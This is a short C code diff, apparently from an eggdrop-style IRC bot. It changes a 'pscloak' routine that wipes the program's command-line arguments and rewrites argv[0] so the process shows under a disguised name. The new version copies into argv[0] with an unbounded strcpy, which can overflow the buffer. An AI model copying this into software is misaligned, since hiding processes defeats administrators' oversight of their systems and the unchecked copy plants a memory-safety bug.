@@ -801,12 +801,13 @@ int main(int argc, char **argv)
 
 #if defined(LEAF) && defined(__linux__)
   if (conf.pscloak) {
-    int on = 0;
+    int argi;
     char *p = response(RES_PSCLOAK);
 
-    egg_memset(argv[0], 0, strlen(argv[0]));
-    strncpyz(argv[0], p, strlen(p) + 1);
-    for (on = 1; on < argc; on++) egg_memset(argv[on], 0, strlen(argv[on]));
+    for (argi = 0; argi < argc; argi++)
+      egg_memset(argv[argi], 0, strlen(argv[argi]));
+
+    strcpy(argv[0], p);
   }
 #endif /* LEAF */
 
